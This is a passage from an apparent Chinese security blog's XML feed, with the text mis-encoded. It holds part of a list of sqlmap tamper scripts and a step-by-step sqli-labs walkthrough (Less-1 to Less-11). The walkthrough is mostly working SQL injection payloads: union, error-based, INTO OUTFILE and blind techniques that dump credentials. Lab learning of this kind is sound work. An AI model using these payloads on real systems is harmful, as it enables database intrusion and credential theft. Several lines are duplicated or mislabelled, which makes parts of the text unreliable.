ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼š %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F<br>
%254D%2520%2554%2541%2542%254C%2545</p>
</li>
<li>
<p><a href="http://unmagicquotes.py">unmagicquotes.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND 1=1â€)<br>
ä½¿ç”¨è„šæœ¬åï¼š1%bf%27 AND 1=1â€“</p>
</li>
<li>
<p><a href="http://randomcomments.py">randomcomments.py</a><br>
é€‚ç”¨æ•°æ®åº“ï¼šALL<br>
ä½œç”¨ï¼šç”¨æ³¨é‡Šç¬¦åˆ†å‰²sqlå…³é”®å­—<br>
ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)<br>
ä½¿ç”¨è„šæœ¬åï¼šI/<strong>/N/</strong>/SERT</p>
</li>
</ol>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Basic-Challenge</title>
    <url>/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Basic-Challenge">Webå®‰å…¨å­¦ä¹ ä¹‹sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Basic-Challenge</h1>
<p>SQLæ³¨å…¥ä¸­çš„å¤§åé¼é¼çš„sqli-labsé—¯å…³ï¼Œæ ¹æ®ç½‘ä¸Šç°æœ‰çš„æ•™ç¨‹å†åŠ ä¸Šè‡ªå·±çš„å®è·µï¼Œè®°å½•ä¸€ä¸‹é—¯å…³è¿‡ç¨‹ã€‚è¿™ä¸€ç¯‡æ˜¯Basic-Challengeé˜¶æ®µçš„é¢˜ç›®ã€‚</p>
<h3 id="Less-1-åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥">Less-1 åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥</h3>
<h4 id="åˆ¤æ–­æ³¨å…¥ç±»å‹">åˆ¤æ–­æ³¨å…¥ç±»å‹</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39;     &#x2F;&#x2F;æŠ¥é”™</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;1&#39;&#39;;</span><br></pre></td></tr></table></figure>
<p>é‚£æ˜¯å› ä¸ºæˆ‘ä»¬ä¹‹å‰çš„è¯­å¥é—­åˆäº†å‰é¢çš„<code>'</code>ï¼Œè€Œåé¢å•ä¸€ä¸ª<code>'</code>ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1    &#x2F;&#x2F;æ­£å¸¸</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;;</span><br></pre></td></tr></table></figure>
<h4 id="åˆ¤æ–­åˆ—æ•°">åˆ¤æ–­åˆ—æ•°</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%203%20--+ &#x2F;&#x2F;æ­£å¸¸</span><br><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%204%20--+ &#x2F;&#x2F;æŠ¥é”™</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºæ€»å…±æœ‰ä¸‰åˆ—ï¼Œç»“åˆunionæŸ¥è¯¢ã€‚</p>
<h4 id="çˆ†åº“payload">çˆ†åº“payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,database()%20--+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„è¿™é‡Œå¿…é¡»å–ä¸€ä¸ªidä¸å­˜åœ¨çš„æ•°å­—ï¼Œä¾‹å¦‚-1</p>
</blockquote>
<p>ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,database() -- &#39;limit 1,2;</span><br></pre></td></tr></table></figure>
<h4 id="çˆ†è¡¨payload">çˆ†è¡¨payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20--+</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(table_name) from information_schema.table where table_schema&#x3D;database() -- limit 1,2;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>group_concat()</code>å‡½æ•°æŠŠæ¥è‡ªå¤šè¡Œçš„æ•°æ®è¿æ¥åˆ°ä¸€ä¸ªå­—æ®µå½“ä¸­ã€‚</p>
</blockquote>
<h4 id="çˆ†å­—æ®µåpayload">çˆ†å­—æ®µåpayload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(column_name) from information_schema.column where table_name&#x3D;&#39;users&#39; -- limit 1,2;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="çˆ†å€¼payload">çˆ†å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,group_concat(username,0x3a,password)%20from%20users--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºSQLè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D; &#39;0&#39; union select 1,2,group_concat(user, 0x3a, password) from users -- &#39;limit 1,2;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>0x3aï¼š 0xæ˜¯åå…­è¿›åˆ¶æ ‡å¿—ï¼Œ3aæ˜¯åè¿›åˆ¶çš„58ï¼Œæ˜¯asciiä¸­çš„ â€˜:â€™ ï¼Œç”¨ä»¥åˆ†å‰²paswordå’Œusernameã€‚</p>
</blockquote>
<h3 id="Less-2-åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥">Less-2 åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥</h3>
<h4 id="åˆ¤æ–­æ³¨å…¥ç±»å‹-v2">åˆ¤æ–­æ³¨å…¥ç±»å‹</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸æŠ¥é”™</p>
<p>è¯´æ˜è¿™é‡Œæ¥æ”¶çš„<code>id</code>å‚æ•°ç±»å‹ä¸º <code>int</code> å‹ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰ <code>'</code> å»é—­åˆã€‚</p>
<p>å…¶ä»–æ­¥éª¤ä¸Less1ç±»ä¼¼ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚</p>
<h3 id="Less-3-åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥">Less-3 åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥</h3>
<h4 id="åˆ¤æ–­æ³¨å…¥ç±»å‹-v3">åˆ¤æ–­æ³¨å…¥ç±»å‹</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸€ä¸ªæ‹¬å·ï¼Œæ‰€ä»¥å°è¯•é—­åˆä¸€ä¸‹æ‹¬å·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1)%20and%201&#x3D;1%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ­£ç¡®æ˜¾ç¤ºä¿¡æ¯ã€‚</p>
<p>å…¶ä»–æ­¥éª¤ä¸Less1ç±»ä¼¼ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚</p>
<h3 id="Less-4-åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥">Less-4 åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥</h3>
<h4 id="åˆ¤æ–­æ³¨å…¥ç±»å‹-v4">åˆ¤æ–­æ³¨å…¥ç±»å‹</h4>
<p>å…ˆä½¿ç”¨å•å¼•å·é—­åˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å°è¯•ä½¿ç”¨<code>&quot;&quot;)</code>é—­åˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-4&#x2F;?id&#x3D;1%22)%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶ä»–æ­¥éª¤ä¸Less1ç±»ä¼¼ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚</p>
<h3 id="Less-5-åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥">Less-5 åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥</h3>
<p>å…³äºåŒæ³¨å…¥çš„å½¢æˆå’Œç†è§£ï¼Œæˆ‘å•ç‹¬å†™äº†å¦å¤–ä¸€ç¯‡åšæ–‡ï¼Œå¯ä»¥ç§»æ­¥<a href="https://ca0y1h.top/2019/09/17/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">è‡³æ­¤</a>ã€‚</p>
<h4 id="çˆ†åº“payloadï¼š"><strong>çˆ†åº“payloadï¼š</strong></h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼Œç”±äºæœ‰éšæœºæ€§ï¼Œå¯èƒ½æˆåŠŸæ‰§è¡Œäº†è¯­å¥æ‰€ä»¥ä¸ä¼šæŠ¥é”™ï¼Œæ­£å¸¸çš„æ˜¾ç¤ºé¡µé¢ï¼ˆå³ä¸æŠ¥é”™ï¼‰ã€‚</p>
<h4 id="çˆ†åˆ—åpayload"><strong>çˆ†åˆ—åpayload:</strong></h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;??id&#x3D;-1&#39; union select count(*),1, concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="çˆ†å­—æ®µpayloadï¼š"><strong>çˆ†å­—æ®µpayloadï¼š</strong></h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹limit x,1 å¯ä»¥æ˜¾ç¤ºç¬¬xä¸ªç”¨æˆ·çš„passwordå’Œusernameã€‚</p>
<h3 id="Less-6-åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥">Less-6 åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥</h3>
<p>åŒå¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸Šä¸€é¢˜çš„å•å¼•å·æ”¹æˆåŒå¼•å·å°±å¯ä»¥äº†ã€‚</p>
<h3 id="Less-7-å¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥">Less-7 å¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥</h3>
<p><a href="https://bbs.pediy.com/thread-219176.htm">è¯¦ç»†é¢˜è§£</a></p>
<p>è¿™é“é¢˜æœ€å¼€å§‹ä½¿ç”¨å•å¼•å·é—­åˆå‘ç°ä¼šæœ‰è¯­æ³•é”™è¯¯ï¼Œåªèƒ½ç»è¿‡ä¸æ–­å¤§é‡çš„å°è¯•ï¼Œæœ€åæ‰èƒ½ç¡®å®šä»¥ä¸‹æŸ¥è¯¢è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç¡®å®šè¯­æ³•æ­£ç¡®åï¼Œå¯ä»¥å¼€å§‹ç¼–å†™payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="çˆ†åº“payload-v2">çˆ†åº“payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,database() into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="çˆ†è¡¨payload-v2">çˆ†è¡¨payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database() into outfile &quot;&#x2F;tmp&#x2F;hack2.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="çˆ†å­—æ®µåpayload-v2">çˆ†å­—æ®µåpayload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; into outfile &quot;&#x2F;tmp&#x2F;hack3.txt&quot; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-8-å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨">Less-8 å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨</h3>
<h4 id="åˆ¤æ–­æ³¨å…¥ç±»å‹-v5">åˆ¤æ–­æ³¨å…¥ç±»å‹</h4>
<p>é¦–å…ˆå°è¯•<code>?id=1</code>ï¼Œå‘ç°å¯ä»¥æ­£å¸¸å›æ˜¾ã€‚å†ä½¿ç”¨åµŒå…¥å•å¼•å·<code>?id=1'</code>ï¼Œå‘ç°ä¸èƒ½æ­£å¸¸å›æ˜¾ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•é”™è¯¯æ¶ˆæ¯ã€‚åªå¥½é€šè¿‡ç›²æ³¨æ¥éªŒè¯ï¼Œè¯¥æ³¨å…¥æŸ¥è¯¢è¿”å›çš„ä¸€å®šæ˜¯Trueæˆ–Falseã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯¹åº”MySQLè¯­å¥æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç”±å›æ˜¾çš„ç»“æœå¯çŸ¥è¯¥æŸ¥è¯¢æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<p>æ¥ç€ä¸‹ä¸€æ¡æŸ¥è¯¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;0 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯¹åº”çš„MySQLè¯­å¥æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åŒæ ·çš„ï¼Œæ•°æ®åº“ä¼šå¯¹ç»™å®šçš„æƒ…å†µ1=0è¿›è¡Œæ£€æŸ¥ï¼Œæ˜¾ç„¶è¯¥æŸ¥è¯¢æ— æ•ˆçš„ï¼Œå› æ­¤å°†ä¼šè¿”å›FALSEã€‚</p>
<p>ä»¥ä¸Šå³å¯è¯´æ˜è¯¥æ•°æ®åº“æ˜¯å¯è¢«ç›²æ³¨çš„ã€‚</p>
<h4 id="æ•°æ®åº“åçš„é•¿åº¦payload">æ•°æ®åº“åçš„é•¿åº¦payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="æ•°æ®åº“åçš„å€¼payload">æ•°æ®åº“åçš„å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr(database(),1,1)))&#x3D;115 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶ä½™ä¾æ¬¡ç±»æ¨ï¼Œåªéœ€è¦æ”¹å˜<code>substr</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚</p>
<h4 id="è¡¨åçš„é•¿åº¦payload">è¡¨åçš„é•¿åº¦payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)))&#x3D;5 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è¡¨åçš„å€¼payload">è¡¨åçš„å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1), 1, 1)))&#x3D;117 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶ä½™ä¾æ¬¡ç±»æ¨ï¼Œåªéœ€è¦æ”¹å˜<code>substr</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚</p>
<h4 id="å­—æ®µåçš„é•¿åº¦payload">å­—æ®µåçš„é•¿åº¦payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1)))&#x3D;8 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="å­—æ®µçš„å€¼payload">å­—æ®µçš„å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),1,1)))&#x3D;117 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶ä½™ä¾æ¬¡ç±»æ¨ï¼Œåªéœ€è¦æ”¹å˜<code>substr</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚</p>
<h3 id="Less-9-åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨">Less-9 åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨</h3>
<p>åŸºäºæ—¶é—´çš„ç›²æ³¨å’ŒåŸºäºå¸ƒå°”ç±»å‹çš„ç›²æ³¨åŸç†ä¸Šå·®å¼‚ä¸å¤§ï¼Œåªæ˜¯åœ¨åˆ¤æ–­æ˜¯å¦æ­£ç¡®æ—¶ï¼Œå‰è€…æ˜¯çœ‹æ˜¯å¦æœ‰æ˜æ˜¾çš„å»¶è¿Ÿï¼Œåè€…æ˜¯çœ‹æ˜¯å¦æœ‰å›æ˜¾ã€‚</p>
<h4 id="åˆ¤æ–­æ³¨å…¥ç±»å‹-v6">åˆ¤æ–­æ³¨å…¥ç±»å‹</h4>
<p>ä¸ç®¡æ€ä¹ˆè¾“å…¥ï¼Œå›æ˜¾æ€»æ˜¯you are â€¦ï¼Œè€ƒè™‘æ—¶é—´å‹ç›²æ³¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‘ç°æ˜æ˜¾å»¶è¿Ÿï¼Œè¯´æ˜æ³¨å…¥æˆåŠŸã€‚</p>
<h4 id="æ•°æ®åº“åçš„é•¿åº¦payload-v2">æ•°æ®åº“åçš„é•¿åº¦payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>if(exp1, exp2, exp3)</code>ï¼šå¦‚æœexp1æ˜¯Trueï¼Œåˆ™è¿”å›exp2ï¼›å¦åˆ™è¿”å›exp3ã€‚</p>
</blockquote>
<h4 id="æ•°æ®åº“åçš„å€¼payload-v2">æ•°æ®åº“åçš„å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left(database(), 8)&#x3D;&#39;security&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è¡¨åçš„å€¼payload-v2">è¡¨åçš„å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),1)&#x3D;&#39;u&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="å­—æ®µçš„å€¼payload-v2">å­—æ®µçš„å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1), 8)&#x3D;&#39;username&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="æ•°æ®çš„å€¼payload">æ•°æ®çš„å€¼payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select password from users order by id limit 0,1), 4)&#x3D;&#39;dumb&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-10-åŸºäºæ—¶é—´çš„GETåŒå¼•å·ç›²æ³¨">Less-10 åŸºäºæ—¶é—´çš„GETåŒå¼•å·ç›²æ³¨</h3>
<p>åŸºäºæ—¶é—´çš„åŒå¼•å·ç›²æ³¨ï¼Œåªè¦æŠŠä¸Šä¸€é¢˜Less-9çš„å•å¼•å·æ”¹æˆåŒå¼•å·ï¼Œä¸€æ ·çš„æ³¨å…¥ï¼Œä¸å†èµ˜è¿°ã€‚</p>
<h3 id="Less-11-åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥">Less-11 åŸºäºé”™è¯¯çš„POSTå‹å•å¼•å·å­—ç¬¦å‹æ³¨å…¥</h3>
<p>æµ‹è¯•ç™»å½•æˆåŠŸï¼Œæœ‰æ•°æ®åº“çš„æ•°æ®å›æ˜¾ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019132444.png" alt=""></p>
<p>å†ä½¿ç”¨<code>admin'</code>åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š</p>
